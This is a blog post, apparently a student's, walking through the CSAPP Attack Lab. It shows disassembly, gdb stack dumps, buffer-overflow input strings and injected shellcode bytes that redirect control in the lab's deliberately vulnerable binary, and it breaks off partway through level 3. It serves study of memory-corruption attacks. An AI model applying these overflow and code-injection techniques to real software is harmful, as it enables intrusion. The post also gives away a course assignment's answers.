<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="Grideaé™æ€ä¸ªäººåšå®¢">
<meta name="description" content="ç‹¬è¯­æ–œé˜‘">
<meta name="theme-color" content="#000">
<title>CSAPP: Attacklab | è¯­é˜‘gz</title>
<link rel="shortcut icon" href="/favicon.ico?v=1628411867976">
<link rel="stylesheet" href="/media/css/gemini.css">
<link rel="stylesheet" href="/media/fonts/font-awesome.css">


<link href="/media/hljs/styles/default.css"
  rel="stylesheet">

<link rel="stylesheet" href="/styles/main.css">
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script src="/media/js/jquery.js"></script>
<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
  onload="renderMathInElement(document.body);"></script>






  <meta name="description" content="CSAPP: Attacklab" />
  <meta name="keywords" content="CSAPP" />
</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="gemini">
  <header class="header  ">
    <div class="blog-header box-shadow-wrapper bg-color " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="brand">
              <span>è¯­é˜‘gz</span>
            </a>  
          
        </div>
        
          <p class="subtitle">ç‹¬è¯­æ–œé˜‘</p>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-home"></i> é¦–é¡µ
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/archives/" target="_self">
                  <i class="fa fa-archive"></i> å½’æ¡£
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tags/" target="_self">
                  <i class="fa fa-tags"></i> æ ‡ç­¾
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/post/about/" target="_self">
                  <i class="fa fa-user"></i> å…³äº
                </a>
              
            </li>
          
          
            
              <li class="nav-item ">
                <a href="/friends/" target="_self">
                  
                    <i class="fa fa-address-book"></i> å‹æƒ…é“¾æ¥
                  
                </a>
              </li>
            
          
          
            <li id="fa_search" class="nav-item">
              <a href="javascript:void(0);">
                <i class="fa fa-search"></i> <span class="language" data-lan="search">æœç´¢</span>
              </a>
            </li>
          
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout gemini ">
      <div class="section-layout-wrapper">
        

<div class="sidebar">
  
    <div class="sidebar-box box-shadow-wrapper bg-color right-motion" id="sidebar">
      
        <div class="post-list-sidebar">
          <div class="sidebar-title">
            <span id="tocSideBar" class="sidebar-title-item sidebar-title-active language" data-lan="index">æ–‡ç« ç›®å½•</span>
            <span id="metaSideBar" class="sidebar-title-item language" data-lan="preview">ç«™ç‚¹æ¦‚è§ˆ</span>
          </div>
        </div>
      
      <div class="sidebar-body gemini" id="sidebar_body">
        
          
            <div class="post-side-meta" id="post_side_meta">
              
<div class="sidebar-wrapper box-shadow-wrapper bg-color">
  <div class="sidebar-item">
    <img class="site-author-image right-motion" src="/images/avatar.png"/>
    <p class="site-author-name">è¯­é˜‘gz</p>
    
    <div class="site-description right-motion">
      
      
      
        <p>ç‹¬è¯­æ–œé˜‘</p>
      
      
    </div>
    
  </div>
  <div class="sidebar-item side-item-stat right-motion">
    <div class="sidebar-item-box">
      <a href="/archives/">
        
        <span class="site-item-stat-count">27</span>
        <span class="site-item-stat-name language" data-lan="article">æ–‡ç« </span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="">
        <span class="site-item-stat-count">10</span>
        <span class="site-item-stat-name language" data-lan="category">åˆ†ç±»</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="/tags/">
        <span class="site-item-stat-count">10</span>
        <span class="site-item-stat-name language" data-lan="tag">æ ‡ç­¾</span>
      </a>
    </div>
  </div>
  
    
  
  
    <div class="sidebar-item sidebar-item-social">
      <div class="social-item">
        
          
            <a href="https://github.com/yulangz">
              <i class="fa fa-github" title="github"></i>
            </a>
          
            <a href="mailto:1301481108@qq.com">
              <i class="fa fa-envelope-o" title="é‚®ç®±"></i>
            </a>
          
        
        
          
            <a class="social-img" href="#">
              <img src="" />
              <i class="fa fa-globe" title="" ></i>
            </a>
          
        
      </div>
    </div>
  



</div>
            </div>
            <div class="post-toc sidebar-body-active" id="post_toc" style="opacity: 1;">
              <div class="toc-box right-motion">
  <div class="toc-wrapper auto-number auto"
    id="toc_wrapper">
    <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#level1">Level1</a>
<ul>
<li><a href="#%E6%9F%A5%E7%9C%8Btouch1%E7%9A%84%E5%9C%B0%E5%9D%80">æŸ¥çœ‹touch1çš„åœ°å€</a></li>
<li><a href="#%E6%9E%84%E9%80%A0%E6%88%91%E4%BB%AC%E7%9A%84%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2">æ„é€ æˆ‘ä»¬çš„è¾“å…¥å­—ç¬¦ä¸²</a></li>
<li><a href="#%E9%80%9A%E8%BF%87hex2raw%E7%94%9F%E6%88%90%E6%94%BB%E5%87%BB%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B9%B6%E6%89%A7%E8%A1%8C">é€šè¿‡hex2rawç”Ÿæˆæ”»å‡»å­—ç¬¦ä¸²å¹¶æ‰§è¡Œ</a></li>
</ul>
</li>
<li><a href="#level2">Level2</a>
<ul>
<li><a href="#%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E6%8F%92%E5%85%A5%E7%9A%84%E4%BB%A3%E7%A0%81">æˆ‘ä»¬éœ€è¦æ’å…¥çš„ä»£ç </a>
<ul>
<li><a href="#%E9%80%9A%E8%BF%87gdb%E6%9F%A5%E7%9C%8Brep%E7%9A%84%E5%80%BC">é€šè¿‡gdbæŸ¥çœ‹%repçš„å€¼</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#level3">Level3</a><br>
*
<ul>
<li><a href="#%E7%94%9F%E6%88%90%E6%9C%BA%E5%99%A8%E7%A0%81">ç”Ÿæˆæœºå™¨ç </a></li>
<li><a href="#%E6%9C%80%E7%BB%88%E5%86%99%E5%87%BA%E5%85%A5%E4%BE%B5%E5%AD%97%E4%B8%B2">æœ€ç»ˆå†™å‡ºå…¥ä¾µå­—ä¸²</a></li>
<li><a href="#%E9%80%9A%E8%BF%87">é€šè¿‡ï¼ï¼ï¼</a></li>
</ul>
</li>
<li><a href="#rtarget">rtarget</a>
<ul>
<li><a href="#1">1</a></li>
<li><a href="#2">2</a></li>
</ul>
</li>
</ul>
</li>
</ul>

  </div>
</div>

<script>

  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
  let active = 'active-show', activeClass = 'active-current';
  let tocWrapper = document.querySelector('#toc_wrapper');
  let tocContent = tocWrapper.children[0];
  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');

  function addTocNumber(elem, deep) {
    if (!elem) {
      return;
    }
    let prop = elem.__proto__;

    if (prop === HTMLUListElement.prototype) {
      for (let i = 0; i < elem.children.length; i++) {
        addTocNumber(elem.children[i], deep + (i + 1) + '.');
      }
    } else if (prop === HTMLLIElement.prototype) {
      // ä¿å­˜liå…ƒç´ 
      if (elem.children[0] && elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
        lList.push(elem);
      }
      for (let i = 0; i < elem.children.length; i++) {
        let cur = elem.children[i];
        if (cur.__proto__ === HTMLAnchorElement.prototype) {
          if (autoNumber) {
            cur.text = deep + ' ' + cur.text;
          }
        } else if (cur.__proto__ === HTMLUListElement.prototype) {
          addTocNumber(cur, deep);
        }
      }
    }
  }

  function removeParentActiveClass() {
    let parents = tocContent.querySelectorAll('.' + active)
    parents.forEach(function (elem) {
      elem.classList.remove(active);
    });
  }

  function addActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.add(activeClass);
    }
  }

  function removeActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.remove(activeClass);
    }
  }

  function addActiveLiElemment(elem, parent) {
    if (!elem || elem === parent) {
      return;
    } else {
      if (elem.__proto__ === HTMLLIElement.prototype) {
        elem.classList.add(active);
      }
      addActiveLiElemment(elem.parentElement, parent);
    }
  }

  function showToc() {
    if (tocWrapper) {
      postBody = document.querySelector('#post_body');
      for (let i = 0; i < postBody.children.length; i++) {
        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
          hList.push(postBody.children[i]);
        }
      }
      if (tocWrapper.classList.contains('compress')) {
        tocContent.classList.add('closed');
      } else if (tocWrapper.classList.contains('no_compress')) {
        tocContent.classList.add('expanded');
      } else {
        if (hList.length > 10) {
          active = 'active-hidden'
          tocContent.classList.add('closed');
        } else {
          tocContent.classList.add('expanded');
        }
      }
    }
  }

  (function () {
    // å¤„ç†ä¸æ˜¯ä»#ä¸€çº§æ ‡é¢˜å¼€å§‹ç›®å½•
    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
      let con = tocContent.children[0].children[0];
      tocContent.innerHTML = con.innerHTML;
    }
    let markdownItTOC = document.querySelector('.markdownIt-TOC');
    let innerHeight = window.innerHeight;
    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
    addTocNumber(tocContent, '');
  })();

  document.addEventListener('scroll', function (e) {
    if (lList.length <= 0) {
      return;
    }
    let scrollTop = document.scrollingElement.scrollTop + 10;
    let dir;

    if (lastTop - scrollTop > 0) {
      dir = 'up';
    } else {
      dir = 'down';
    }

    lastTop = scrollTop;
    if (scrollTop <= 0) {
      if (lastIndex >= 0 && lastIndex < hList.length) {
        lList[lastIndex].classList.remove(activeClass);
      }
      return;
    }

    let current = 0, hasFind = false;
    for (let i = 0; i < hList.length; i++) {
      if (hList[i].offsetTop > scrollTop) {
        current = i;
        hasFind = true;
        break;
      }
    }
    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
      current = hList.length - 1;
    } else {
      current--;
    }
    if (dir === 'down') {
      if (current > lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex)
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    } else {
      if (current < lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex);
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    }
  });


  window.addEventListener('load', function () {
    showToc();
    document.querySelector('#sidebar').style = 'display: block;';
    tocWrapper.classList.add('toc-active');
    setTimeout(function () {
      if ("createEvent" in document) {
        let evt = document.createEvent("HTMLEvents");
        evt.initEvent("scroll", false, true);
        document.dispatchEvent(evt);
      }
      else {
        document.fireEvent("scroll");
      }
    }, 500)
  })

</script>
            </div>
          
        
      </div>
    </div>
  
</div>
<script>
  const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
  const SIDEBAR_BODY_ACTIVE = 'sidebar-body-active';
  const SLIDE_UP_IN = 'slide-up-in';

  let sidebar = document.querySelector('#sidebar'),
  tocSideBar = document.querySelector('#tocSideBar'),
  metaSideBar = document.querySelector('#metaSideBar'),
  postToc = document.querySelector('#post_toc'),
  postSiteMeta = document.querySelector('#post_side_meta'),
  sidebarTitle = document.querySelector('.sidebar-title'),
  sidebarBody = document.querySelector('#sidebar_body');

  tocSideBar && tocSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  metaSideBar && metaSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  function toggleSidebar(e) {
    let currentTitle = document.querySelector("."+SIDEBAR_TITLE_ACTIVE);
    if (currentTitle == e.srcElement) {
      return ;
    }
    let current, showElement, hideElement;
    if (e.srcElement == metaSideBar) {
      showElement = postSiteMeta;
      hideElement = postToc;
    } else if (e.srcElement == tocSideBar){
      showElement = postToc;
      hideElement = postSiteMeta;
    }
    currentTitle.classList.remove(SIDEBAR_TITLE_ACTIVE);
    e.srcElement.classList.add(SIDEBAR_TITLE_ACTIVE);

    jQuery.Velocity(hideElement, 'stop');
    jQuery.Velocity(hideElement, 'transition.slideUpOut', {
      display: 'none',
      duration: 200,
      complete: function () {
        jQuery.Velocity(showElement, 'transition.slideDownIn', {
          duration: 200
        });
      }
    })
    hideElement.classList.remove(SIDEBAR_BODY_ACTIVE);
    showElement.classList.add(SIDEBAR_BODY_ACTIVE);
  }

  postToc && postToc.addEventListener('transitionend', function() {
    this.classList.remove(SLIDE_UP_IN);
  });

  if (sidebarBody) {
    if (sidebarBody.classList.contains('pisces') || sidebarBody.classList.contains('gemini')) {
      let hasFix = false;
      let scrollEl = document.querySelector('.main-continer');
      let limitTop = document.querySelector('#nav_ul').children.length * 42 + 162;
      window.addEventListener('scroll', function(e) {
        if (document.scrollingElement.scrollTop >= limitTop) {
          if (!hasFix) {
            sidebar.classList.add('sidebar-fixed');
            hasFix = true;
          }
        } else {
          if (hasFix) {
            sidebar.classList.remove('sidebar-fixed');
            hasFix = false;
          }
        }
      });
    }
  }
  
</script>
        <div class="section-box box-shadow-wrapper">
          <div class="section bg-color post post-page">
            <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://yulan.net.cn/post/uscxh7_ainkg2/">
      CSAPP: Attacklab
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">å‘å¸ƒäº</span>
      <span class="publish-time" data-t="2021-08-06 13:35:26">2021-08-06</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show language" data-lan="category-in">åˆ†ç±»äº</span>
      
      
      <a href="https://yulan.net.cn/tag/Gr1xnj72j/">
        <span>CSAPP</span>
      </a>
      
      
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>11<span class="language" data-lan="minute">åˆ†é’Ÿ</span></span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>2144<span class="pc-show language" data-lan="words">å­—æ•°</span></span>
    </span>
    
  </div>
</section>
            <div class="post-body next-md-body" id="post_body">
              <p>è¿™ä¸ªå®éªŒè¦æ±‚åœ¨5ä¸ªæœ‰ä¸åŒå®‰å…¨æ¼æ´çš„ä»£ç ä¸Šè¿›è¡Œæ”»å‡»(ä¸€å¼€å§‹æˆ‘è¿˜ä»¥ä¸ºæ˜¯è¦ä¿®å¤æ¼æ´...)ï¼Œæ€»å…±æœ‰ä¸¤ç§æ”»å‡»æ–¹å¼ï¼š</p>
<ul>
<li>Code Injection Attacksï¼ˆç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼‰</li>
<li>Return-Oriented Programmingï¼ˆROPæ”»å‡»ï¼‰</li>
</ul>
<p>ä»CSAPPç½‘ç«™ä¸‹è½½ä¸‹æ¥è§£å‹åä¸€å…±æœ‰äº”ä¸ªæ–‡ä»¶ï¼š</p>
<ul>
<li><code>ctarget</code>ï¼šä¸€ä¸ªå®¹æ˜“é­å—code injectionæ”»å‡»çš„å¯æ‰§è¡Œç¨‹åºã€‚</li>
<li><code>rtarget</code>ï¼šä¸€ä¸ªå®¹æ˜“é­å—return-oriented programmingæ”»å‡»çš„å¯æ‰§è¡Œç¨‹åºã€‚</li>
<li><code>cookie.txt</code>ï¼šä¸€ä¸ª8ä½çš„åå…­è¿›åˆ¶ç ï¼Œç”¨äºéªŒè¯èº«ä»½çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚</li>
<li><code>farm.c</code>ï¼šç›®æ ‡â€œgadget farmâ€çš„æºä»£ç ï¼Œç”¨äºäº§ç”Ÿreturn-oriented programmingæ”»å‡»ã€‚</li>
<li><code>hex2raw</code>ï¼šä¸€ä¸ªç”Ÿæˆæ”»å‡»å­—ç¬¦ä¸²çš„å·¥å…·ã€‚</li>
</ul>
<p>å®éªŒä¹‹å‰ä¸€å®šè¦é˜…è¯»<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">æŒ‡å¯¼æ‰‹å†Œ</a>ï¼Œè¿˜æœ‰<a href="http://csapp.cs.cmu.edu/2e/docs/gdbnotes-x86-64.pdf">GDBæŒ‡å—</a>ï¼Œå¯¹å®éªŒå¾ˆæœ‰å¸®åŠ©ã€‚</p>
<h2 id="level1">Level1</h2>
<p>è¦æ±‚æˆ‘ä»¬è¾“å…¥ä¸€æ®µå­—ç¬¦ä¸²ï¼Œé€šè¿‡ç¼“å†²åŒºæº¢å‡ºæ”¹å˜å‡½æ•°çš„è¿”å›åœ°å€ï¼Œå®šå‘åˆ° <code>touch1</code>Â å‡½æ•°<br>
é¦–å…ˆçœ‹çœ‹ <code>test</code>Â å‡½æ•°ï¼š</p>
<pre><code>0000000000401968 &lt;test&gt;:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 &lt;getbuf&gt;
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq
</code></pre>
<p>æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«ä¹‹å¤„<br>
æˆ‘ä»¬å†çœ‹ä¸‹ <code>getbuf</code>Â å‡½æ•°ï¼š</p>
<pre><code>00000000004017a8 &lt;getbuf&gt;:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
</code></pre>
<p>é¦–å…ˆåˆ›å»ºä¸€ä¸ª 40 ä¸ªå­—èŠ‚çš„ç¼“å†²åŒº( <code>0x28=40</code>Â )ï¼Œç„¶åé€šè¿‡Getså‡½æ•°è¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²åˆ°ç¼“å†²åŒºã€‚<br>
æˆ‘ä»¬å…ˆæ¥æŸ¥çœ‹ä¸€ä¸‹stackçš„çŠ¶æ€ï¼š</p>
<pre><code>(gdb) x/60b $rsp
0x5561dc78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca8:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00
</code></pre>
<p>å¯ä»¥çœ‹åˆ°è·ç¦» <code>%rsp</code> çš„ç¬¬41,42,43å­—èŠ‚å¤„æœ‰ä¸€ä¸ªå€¼ <code>761940</code> ï¼ŒçŒœæµ‹è¿™æ˜¯ä¸€ä¸ªè¿”å›åœ°å€ï¼ŒCtrl+FæŸ¥æ‰¾<br>
ç„¶è€Œ<br>
<img src="http://static.yulan.net.cn/image/_0da3636d63a59ddbf940c5191d99cf0e.png" alt="" loading="lazy"><br>
å¿½ç„¶æƒ³èµ·å°ç«¯åºçš„é—®é¢˜ï¼Œæ‰€ä»¥è¿™ä¸ªåœ°å€åº”è¯¥æ˜¯ <code>401976</code><br>
<img src="http://static.yulan.net.cn/image/_65725cc8a986fa6dbca8525ef2087c08.png" alt="" loading="lazy"><br>
å°±æ˜¯getbufå‡½æ•°åä¸€æ¡æŒ‡ä»¤çš„ä½ç½®ã€‚<br>
æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦é€šè¿‡ç¼“å†²åŒºæº¢å‡ºæ¥æ”¹å˜è¿™ä¸ªæŒ‡ä»¤åœ°å€å³å¯ã€‚</p>
<h3 id="æŸ¥çœ‹touch1çš„åœ°å€">æŸ¥çœ‹touch1çš„åœ°å€</h3>
<pre><code>00000000004017c0 &lt;touch1&gt;:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
</code></pre>
<h3 id="æ„é€ æˆ‘ä»¬çš„è¾“å…¥å­—ç¬¦ä¸²">æ„é€ æˆ‘ä»¬çš„è¾“å…¥å­—ç¬¦ä¸²</h3>
<pre><code>11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 c0 17 40
</code></pre>
<p>å‰40ä½ä¸é‡è¦</p>
<h3 id="é€šè¿‡hex2rawç”Ÿæˆæ”»å‡»å­—ç¬¦ä¸²å¹¶æ‰§è¡Œ">é€šè¿‡hex2rawç”Ÿæˆæ”»å‡»å­—ç¬¦ä¸²å¹¶æ‰§è¡Œ</h3>
<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./hex2raw &lt; exploit1.txt &gt; exploit1-raw.txt
ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit1-raw.txt 
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 C0 17 40
</code></pre>
<p>é€šè¿‡ï¼ï¼ï¼</p>
<h2 id="level2">Level2</h2>
<p>è¿™ä¸€å…³è¦æˆ‘ä»¬ä»testè·³è½¬åˆ°å¦å¤–ä¸€ä¸ªå‡½æ•° <code>touch2</code> ï¼ŒåŒæ—¶å°†æˆ‘ä»¬è‡ªå·±çš„cookieä½œä¸ºå‚æ•°ä¼ ç»™ <code>touch2</code>Â ï¼Œè¿™ä¸ªå‚æ•°é»˜è®¤åº”è¯¥åœ¨%rdiä¸­ã€‚<br>
è¿™ä¸€å…³æˆ‘ä»¬ä¸ä»…è¦ä¿®æ”¹è·³è½¬åœ°å€ï¼Œè¿˜è¦æ’å…¥ä¸€æ®µä»£ç è¿›å»æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥æŠŠè¿™æ®µä»£ç æ’åœ¨ç¼“å†²åŒºä¹‹ä¸­ï¼Œç„¶åå°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºæˆ‘ä»¬ä»£ç çš„åœ°å€ï¼Œå¹¶æˆ‘ä»¬çš„ä»£ç ä¸­åŠ å…¥retæŒ‡ä»¤ï¼Œä½¿ä»–æœ€åè¿”å›åˆ° <code>touch2</code>Â çš„å…¥å£</p>
<h3 id="æˆ‘ä»¬éœ€è¦æ’å…¥çš„ä»£ç ">æˆ‘ä»¬éœ€è¦æ’å…¥çš„ä»£ç </h3>
<pre><code>mov $0x59b997fa,%rdi
pushq $0x4017ec
retq
</code></pre>
<p>å¾ˆç®€å•ï¼Œåªç”¨å°†cookieä¿å­˜åˆ°%rdiï¼Œç„¶åé‡æ–°æŒ‡å®š <code>touch2</code>Â çš„åœ°å€ä¸ºè¿”å›åœ°å€å³å¯<br>
ä½¿ç”¨gccä¸objdumpç”Ÿæˆæœºå™¨æŒ‡ä»¤</p>
<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ gcc -c asscode.s
ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ objdump -d asscode.o

asscode.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
</code></pre>
<p>æŠŠæŒ‡ä»¤æ’åœ¨ç¼“å†²åŒº</p>
<pre><code>48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  78 dc 61 55
</code></pre>
<p>å’Œlevel1ä¸€æ ·ï¼Œå‰é¢40ä¸ªå­—èŠ‚ï¼Œåé¢æ˜¯æˆ‘ä»¬æŒ‡å®šçš„è¿”å›åœ°å€ï¼Œè¿™é‡Œæˆ‘ä»¬è¦å°†ä»–æŒ‡å®šä¸ºæˆ‘ä»¬çš„ä»£ç æ’å…¥çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯ç¼“å­˜åŒºçš„èµ·å§‹åœ°å€ã€‚</p>
<h4 id="é€šè¿‡gdbæŸ¥çœ‹repçš„å€¼">é€šè¿‡gdbæŸ¥çœ‹%repçš„å€¼</h4>
<pre><code>(gdb) print $rsp
$2 = (void *) 0x5561dc78
</code></pre>
<p>æ‰€ä»¥æœ€åå››ä¸ªå­—èŠ‚åº”è¯¥æ˜¯ <code>78</code>Â <code>dc</code>Â <code>61</code>Â <code>55</code><br>
æœ€åå’Œlevel1ä¸€æ ·æ‰§è¡Œ</p>
<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit2-raw.txt 
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
</code></pre>
<h2 id="level3">Level3</h2>
<p>è¿™ä¸€å…³å’Œlevel2å·®ä¸å¤šï¼Œåªæ˜¯è¿™æ¬¡ä¼ çš„å‚æ•°æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå…¶å®å·®ä¸å¤šï¼Œæˆ‘ä»¬å…ˆæŠŠcookieå­˜åœ¨æ ˆé‡Œé¢ï¼Œç„¶åæŠŠåœ°å€ä¼ ç»™%rdiå³å¯ã€‚<br>
<img src="http://static.yulan.net.cn/image/_d13d42c5c8d72192ca39358968839d97.png" alt="" loading="lazy"><br>
è¦æ³¨æ„å‡½æ•°hexmatchä¼šä½¿ç”¨æ ˆä¸Šçš„ç©ºé—´ï¼Œå¯èƒ½ä¼šè¦†ç›–æˆ‘ä»¬çš„cookie<br>
<strong>ä¸è¿‡æ²¡å…³ç³»ï¼Œ</strong><code>**sub 0x28 %rsp**</code>**Â  ï¼Œå’±ç»™è‡ªå·±é€ ä¸ªæ ˆ**<br>
æ‰€ä»¥æˆ‘ä»¬åµŒå…¥çš„ä»£ç åº”è¯¥æ˜¯</p>
<pre><code>movq $0x5561dc93,%rdi
sub $0x28,%rsp
pushq $0x4018fa
retq
</code></pre>
<p>å…¶ä¸­ç¬¬ä¸€æ­¥ä¼ ç»™%rdiçš„åœ°å€åº”è¯¥æ˜¯ä½ å­˜æ”¾cookieçš„åœ°å€ï¼Œä¸€å®šè¦æ•°æ¸…æ¥šï¼Œæˆ‘ä»¬è¿˜è¦æŠŠcookieä½¿ç”¨asciiç è½¬ä¹‰ï¼Œå¹¶åœ¨æœ«å°¾æ·»åŠ  <code>0x00</code>Â è¡¨ç¤ºç»“æŸã€‚</p>
<h4 id="ç”Ÿæˆæœºå™¨ç ">ç”Ÿæˆæœºå™¨ç </h4>
